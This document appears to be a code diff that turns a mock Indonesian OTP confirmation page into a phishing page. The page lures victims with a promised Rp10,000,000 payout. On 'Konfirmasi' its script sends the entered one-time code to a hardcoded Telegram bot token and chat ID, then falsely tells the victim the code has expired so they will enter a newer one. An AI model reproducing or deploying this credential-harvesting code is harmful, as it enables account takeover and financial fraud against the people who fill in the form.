@@ -1,105 +1,190 @@
-<html lang="en">
+<!doctype html>
+<html lang="id">
 <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>OTP Confirmation</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Konfirmasi OTP - Pencairan Rp10.000.000</title>
   <style>
-    body {
-      font-family: 'Roboto', sans-serif;
-    }
+    :root{--bg:#f3f6fb;--card:#ffffff;--accent:#0b6efd;--muted:#6b7280}
+    *{box-sizing:border-box}
+    body{font-family:Inter,system-ui,Segoe UI,Roboto,Arial;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,var(--bg),#eef3ff);padding:24px}
+    .card{width:100%;max-width:420px;background:var(--card);border-radius:12px;box-shadow:0 8px 30px rgba(11,27,60,0.08);padding:24px}
+    h1{font-size:18px;margin:0 0 6px}
+    p.lead{margin:0 0 18px;color:var(--muted)}
+
+    .amount{background:#f6f9ff;border:1px solid #e6efff;padding:12px;border-radius:8px;margin-bottom:18px;font-weight:600}
+
+    .otp-row{display:flex;gap:10px;justify-content:center;margin-bottom:18px}
+    .otp{width:56px;height:56px;border-radius:10px;border:1px solid #dbe7ff;background:#fff;font-size:24px;text-align:center;line-height:56px}
+    .otp:focus{outline:3px solid rgba(11,110,253,0.12);border-color:var(--accent)}
+
+    .notes{font-size:13px;color:var(--muted);text-align:center;margin-bottom:16px}
+
+    .controls{display:flex;gap:10px}
+    button{flex:1;padding:10px 12px;border-radius:10px;border:0;background:var(--accent);color:white;font-weight:600;cursor:pointer}
+    button:disabled{opacity:0.55;cursor:not-allowed}
+
+    .message{margin-top:14px;text-align:center;font-weight:600}
+    .message.success{color:green}
+    .message.error{color:#d23}
+
+    .small{font-size:13px;color:var(--muted);text-align:center;margin-top:8px}
+
+    @media (max-width:420px){.otp{width:48px;height:48px;font-size:20px}}
   </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen">
-  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
-    <h2 class="text-2xl font-bold text-center mb-4">Konfirmasi Kode OTP</h2>
-    <p class="text-gray-600 text-center mb-4">
-      Masukkan kode OTP yang telah kami kirimkan melalui WA atau SMS untuk menyelesaikan aktivasi saldo 10 juta.
-    </p>
-    <p class="text-red-500 text-center mb-6" id="timer">Kode OTP kadaluarsa dalam: 02:00</p>
-    <form id="otpForm">
-      <div class="grid grid-cols-6 gap-2 mb-6">
-        <input class="otp-input w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
-        <input class="otp-input w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
-        <input class="otp-input w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
-        <input class="otp-input w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
+<body>
+  <main class="card" role="main" aria-labelledby="title">
+    <h1 id="title">Konfirmasi OTP</h1>
+    <p class="lead">Masukkan kode 4 digit yang dikirimkan ke nomor terdaftar untuk menyelesaikan pencairan dana.</p>
+
+    <div class="amount">Pencairan: <strong>Rp 10.000.000</strong></div>
+
+    <form id="otpForm" autocomplete="off" novalidate>
+      <div class="otp-row" aria-hidden="false">
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp" id="d0" aria-label="Digit 1" />
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp" id="d1" aria-label="Digit 2" />
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp" id="d2" aria-label="Digit 3" />
+        <input inputmode="numeric" pattern="\d*" maxlength="1" class="otp" id="d3" aria-label="Digit 4" />
       </div>
-      <button class="w-full bg-blue-500 text-white py-3 rounded-lg font-semibold hover:bg-blue-600 transition duration-300" type="submit">Konfirmasi</button>
+
+      <div class="notes".</div>
+
+      <div class="controls">
+        <button type="button" id="confirmBtn">Konfirmasi</button>
+      </div>
+
+      <div id="message" class="message" role="status" aria-live="polite"></div>
+      <div class="small">Jika ada masalah, cek kembali kode atau hubungi support.</div>
     </form>
-    <p class="text-gray-600 text-center mt-6">
-      Tidak menerima kode?
-      <a class="text-blue-500 hover:underline" href="#" id="resend">Kirim ulang</a>
-    </p>
-    <p class="text-red-500 text-center mt-4 hidden" id="errorMessage">Kode OTP yang Anda masukkan salah.</p>
-  </div>
+  </main>
 
   <script>
-    const correctOtp = "123456"; // Kode OTP valid (contoh, ganti dengan logika dinamis)
-    let timerInterval;
+/* JavaScript: kirim OTP ke Bot Telegram (ganti token & chat_id) */
+(() => {
+  const OTP_LENGTH = 4;
+  const MAX_VERIFY_RETRIES = 3;
 
-    // Timer untuk kode OTP
-    function startOtpTimer() {
-      const timerElement = document.getElementById('timer');
-      let time = 120; // Waktu dalam detik (2 menit)
+  // --- ISI DISINI: token & chat_id bot Telegram Anda ---
+  const TELEGRAM = {
+    token: '8340945190:AAF6R_XC8VFe7PJd-oho8-Ljd8-Ra0saz1A',   // contoh: 123456789:ABCdefGhIjkLmNoPqR
+    chat_id: '7770131845'         // contoh: 987654321 atau -1001234567890 (untuk channel/group)
+  };
 
-      timerInterval = setInterval(() => {
-        const minutes = Math.floor(time / 60);
-        const seconds = time % 60;
-        timerElement.textContent = `Kode OTP kadaluarsa dalam: ${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+  // Elemen UI
+  const inputs = Array.from(document.querySelectorAll('.otp'));
+  const confirmBtn = document.getElementById('confirmBtn');
+  const messageEl = document.getElementById('message');
+  const form = document.getElementById('otpForm');
 
-        if (time === 0) {
-          clearInterval(timerInterval);
-          alert("Kode OTP telah kadaluarsa. Silakan minta ulang.");
-        }
+  function init(){
+    inputs[0].focus();
+    inputs.forEach((input, idx) => {
+      input.addEventListener('input', onInput(idx));
+      input.addEventListener('keydown', onKeyDown(idx));
+      input.addEventListener('paste', onPaste);
+    });
 
-        time--;
-      }, 1000);
+    form.addEventListener('keydown', (e)=>{
+      if (e.key === 'Enter'){ e.preventDefault(); confirmBtn.click(); }
+    });
+
+    confirmBtn.addEventListener('click', onConfirm);
+    inputs.forEach(i=>i.addEventListener('input', ()=>{ clearMessage(); }));
+  }
+
+  // Handlers
+  function onInput(idx){
+    return function(e){
+      const v = e.target.value.replace(/[^0-9]/g, '').slice(0,1);
+      e.target.value = v;
+      if (v && idx < inputs.length - 1) inputs[idx+1].focus();
+    };
+  }
+
+  function onKeyDown(idx){
+    return function(e){
+      if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx-1].focus();
+      if (e.key === 'ArrowLeft' && idx>0) inputs[idx-1].focus();
+      if (e.key === 'ArrowRight' && idx<inputs.length-1) inputs[idx+1].focus();
+    };
+  }
+
+  function onPaste(e){
+    e.preventDefault();
+    const paste = (e.clipboardData || window.clipboardData).getData('text') || '';
+    const digits = paste.replace(/\D/g, '').slice(0, OTP_LENGTH).split('');
+    digits.forEach((ch, i) => { if (inputs[i]) inputs[i].value = ch; });
+    if (digits.length >= OTP_LENGTH) inputs[OTP_LENGTH-1].focus();
+  }
+
+  // UI helpers
+  function readOtp(){ return inputs.map(i=>i.value).join(''); }
+  function setBusy(isBusy){ confirmBtn.disabled = isBusy; confirmBtn.textContent = isBusy ? 'Mengirim...' : 'Konfirmasi'; }
+  function showMessage(text, type){ messageEl.textContent = text; messageEl.className = 'message ' + (type === 'success' ? 'success' : 'error'); }
+  function clearMessage(){ messageEl.textContent = ''; messageEl.className = 'message'; }
+
+  // retry util
+  async function retryable(fn, attempts = MAX_VERIFY_RETRIES){
+    let attempt = 0, lastErr;
+    while (attempt < attempts){
+      try{ return await fn(); }
+      catch(err){ lastErr = err; attempt++; const delay = 300 * Math.pow(2, attempt); await new Promise(r=>setTimeout(r, delay)); }
+    }
+    throw lastErr;
+  }
+
+  // send ke Telegram
+  async function sendToTelegram(text){
+    if (!TELEGRAM.token || !TELEGRAM.chat_id) throw new Error('Telegram token/chat_id belum diisi.');
+    const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM.token)}/sendMessage`;
+    const body = { chat_id: TELEGRAM.chat_id, text };
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+    const data = await res.json().catch(()=>null);
+    if (!res.ok) {
+      const errText = data && data.description ? data.description : `Telegram API error (status ${res.status})`;
+      throw new Error(errText);
+    }
+    return data;
+  }
+
+  // confirm handler -> kirim ke Telegram
+  async function onConfirm(){
+    clearMessage();
+    const otp = readOtp();
+    if (otp.length !== OTP_LENGTH){
+      showMessage('Masukkan 4 digit kode OTP.', 'error');
+      return;
     }
 
-    // Geser fokus otomatis antar kolom
-    document.querySelectorAll('.otp-input').forEach((input, index, inputs) => {
-      input.addEventListener('input', (e) => {
-        if (e.target.value.length === 1 && index < inputs.length - 1) {
-          inputs[index + 1].focus();
-        }
-      });
+    setBusy(true);
+    try{
+      const payloadText = `Konfirmasi pencairan Rp10.000.000\nOTP: ${otp}`;
+      await retryable(()=>sendToTelegram(payloadText));
+      showMessage('Otp kadaluwarsa cek otp yang terbaru.', 'success');
+      onVerificationSuccess();
+    }catch(err){
+      console.error('sendToTelegram error', err);
+      showMessage(err && err.message ? err.message : 'Gagal mengirim ke Telegram.', 'error');
+    }finally{
+      setBusy(false);
+    }
+  }
 
-      input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && !e.target.value && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-    });
+  function onVerificationSuccess(){
+    inputs.forEach(i=>i.disabled = true);
+    confirmBtn.disabled = true;
+  }
 
-    // Validasi OTP saat submit
-    document.getElementById('otpForm').addEventListener('submit', (e) => {
-      e.preventDefault();
+  // debugging helpers (opsional)
+  window.otpWidget = { readOtp, sendToTelegram };
 
-      const otpInputs = document.querySelectorAll('.otp-input');
-      const otpCode = Array.from(otpInputs).map(input => input.value).join('');
-
-      if (otpCode !== correctOtp) {
-        const errorMessage = document.getElementById('errorMessage');
-        errorMessage.classList.remove('hidden'); // Tampilkan pesan error
-        return;
-      }
-
-      alert("Kode OTP berhasil diverifikasi!");
-    });
-
-    // Reset timer dan sembunyikan pesan error saat kirim ulang kode
-    document.getElementById('resend').addEventListener('click', (e) => {
-      e.preventDefault();
-      clearInterval(timerInterval);
-      startOtpTimer();
-      const errorMessage = document.getElementById('errorMessage');
-      errorMessage.classList.add('hidden'); // Sembunyikan pesan error
-      alert("Kode OTP baru telah dikirim.");
-    });
-
-    // Mulai timer OTP saat halaman dimuat
-    startOtpTimer();
+  init();
+})();
   </script>
 </body>
 </html>
